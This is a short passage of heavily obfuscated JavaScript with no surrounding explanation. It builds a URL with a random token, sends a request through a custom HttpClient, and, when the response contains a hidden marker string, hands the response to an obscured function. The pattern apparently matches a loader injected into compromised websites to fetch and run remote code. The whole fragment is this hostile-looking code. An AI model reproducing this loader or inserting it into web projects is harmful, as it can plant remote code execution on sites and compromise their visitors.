HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};